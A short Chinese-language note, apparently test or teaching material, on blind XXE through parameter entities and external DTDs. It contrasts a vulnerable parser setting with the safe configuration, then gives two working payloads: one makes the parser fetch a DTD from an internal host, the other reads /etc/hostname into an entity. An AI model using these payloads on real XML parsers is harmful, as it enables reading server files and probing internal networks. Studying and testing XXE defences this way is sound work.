参数实体盲打 / 外接 DTD

vuln：parser load_dtd=True，% 参数实体可引用外部 DTD，
   解析器会主动出站（intranet:7001）。即便 XML body 没有正常输出，
   只要外部资源被拉取就证明 XXE 成立。
safe：load_dtd=False + resolve_entities=False，外接 DTD 直接拒绝。

PoC 1（外接 DTD，让解析器主动出站）：
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://intranet:7001/public/card">
  %remote;
]>
<root>ping</root>

PoC 2（参数实体 + 文件读取叠加）：
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file://{{ '/etc/hostname' }}">
  <!ENTITY % wrap "<!ENTITY hostname '%file;'>">
  %wrap;
]>
<root>&hostname;</root>
